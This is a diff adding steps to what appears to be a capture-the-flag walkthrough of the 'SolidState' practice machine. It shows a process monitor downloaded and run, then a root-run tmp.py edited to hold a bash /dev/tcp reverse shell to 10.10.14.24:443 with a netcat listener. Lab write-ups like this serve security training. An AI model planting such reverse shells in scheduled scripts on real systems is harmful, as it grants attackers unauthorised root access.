@@ -278,5 +278,22 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget http://10.10.1
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x pspy32
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./pspy32
 ```
+
+![image](https://user-images.githubusercontent.com/83878909/236804133-4b778be0-a376-41dc-9e5f-ee2bc25d0791.png)
 ![image](https://user-images.githubusercontent.com/83878909/236803621-a34c0e8a-8e3d-4802-9a59-498d65a9c5a0.png)
 
+  - The `tmp.py` file is being run by root after every few minutes.
+![image](https://user-images.githubusercontent.com/83878909/236804393-4d317c51-b830-4032-917f-18bba7e9241e.png)
+
+  - Modify the `tmp.py` file to add a reverse shell to it.
+  - Start another `netcat` listener on port `443`.
+```CSS
+os.system('bash -c "bash -i >& /dev/tcp/10.10.14.24/443 0>&1"')
+```
+```CSS
+▶ nc -nlvvp 443
+```
+![image](https://user-images.githubusercontent.com/83878909/236806995-9499288d-b02f-4d65-b7d1-845bc7525df2.png)
+![image](https://user-images.githubusercontent.com/83878909/236807277-40a1afb1-14ee-49b2-9aed-34be17e8fa82.png)
+
+---
